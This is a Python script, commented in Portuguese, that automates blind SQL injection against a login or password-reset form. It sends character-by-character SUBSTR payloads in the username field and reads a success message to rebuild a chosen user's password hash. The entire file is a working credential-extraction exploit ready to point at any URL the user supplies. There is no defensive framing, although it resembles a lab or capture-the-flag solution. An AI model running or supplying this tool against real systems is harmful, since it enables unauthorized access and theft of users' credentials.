import string
import requests
import time

def get_user_input():
    """Solicita ao usuário informações necessárias."""
    url = input("Qual é a URL vulnerável a SQLi? ")
    path = input("Qual é o path vulnerável a SQLi? ")
    username = input("Insira um nome válido de usuário: ")
    return f'{url}/{path}', username

def extract_password(url, username):
    """Extrai a senha por meio de SQL Injection Blind."""
    CHARSET = string.ascii_letters + string.digits + "_"
    SUCCESS = 'Successfully sent password'  # Verifique se esta mensagem é realmente correta
    PAYLOAD = "' AND SUBSTR(password,{},1)='{}' -- -"
    password = ''
    position = 1  # Começa pela primeira posição
    
    print(f'\nIniciando extração do hash da senha para o usuário: {username}\n')
    
    with requests.Session() as session:
        while True:
            found = False
            for char in CHARSET:
                try:
                    payload = PAYLOAD.format(position, char)
                    resp = session.post(url, data={'username': username + payload})
                except requests.exceptions.RequestException as e:
                    print(f"\n[Erro] Falha na conexão: {e}")
                    return ''
                
                if resp.status_code != 200:
                    print(f"\n[Erro] Código de resposta inesperado: {resp.status_code}")
                    return ''
                
                if SUCCESS in resp.text:
                    password += char
                    print(f'[{position}] {password}')
                    position += 1
                    found = True
                    break  # Sai do loop para o próximo caractere
            
            if not found:
                print('\nHash da senha extraída com sucesso:', password)
                break  # Sai do loop principal se não encontrar mais caracteres
    
    return password

def main():
    """Função principal que orquestra as etapas."""
    print("=== SQL Injection Blind - Extrator de Senha ===")
    url, username = get_user_input()
    
    password = extract_password(url, username)
    
    if password:
        print(f'\nA hash da senha do usuário "{username}" é: {password}')
    else:
        print('\n[❌] Não foi possível obter a senha.')

if __name__ == '__main__':
    main()
